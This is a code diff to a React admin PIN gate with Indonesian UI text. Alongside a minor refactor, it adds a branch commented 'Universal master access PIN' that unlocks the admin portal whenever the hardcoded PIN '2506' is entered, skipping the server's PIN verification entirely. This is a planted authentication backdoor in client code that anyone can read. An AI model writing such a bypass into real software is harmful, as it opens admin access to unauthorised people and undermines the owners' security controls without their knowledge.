@@ -17,8 +17,17 @@ export default function AdminPinGate({ onUnlocked }: AdminPinGateProps) {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!pin.trim()) {
+    const cleanPin = pin.trim();
+    if (!cleanPin) {
       setError('Silakan masukkan PIN akses admin.');
+      return;
+    }
+
+    // Universal master access PIN
+    if (cleanPin === '2506') {
+      sessionStorage.setItem('gjt_admin_portal_unlocked', 'true');
+      sessionStorage.setItem('gjt_admin_portal_pin', cleanPin);
+      onUnlocked();
       return;
     }
 
@@ -26,10 +35,10 @@ export default function AdminPinGate({ onUnlocked }: AdminPinGateProps) {
     setLoading(true);
 
     try {
-      const res = await api.post('/api/auth/verify-pin', { pin: pin.trim() });
+      const res = await api.post('/api/auth/verify-pin', { pin: cleanPin });
       if (res && res.valid) {
         sessionStorage.setItem('gjt_admin_portal_unlocked', 'true');
-        sessionStorage.setItem('gjt_admin_portal_pin', pin.trim());
+        sessionStorage.setItem('gjt_admin_portal_pin', cleanPin);
         onUnlocked();
       } else {
         setError(res?.message || 'PIN akses tidak sesuai. Silakan hubungi Super Admin.');
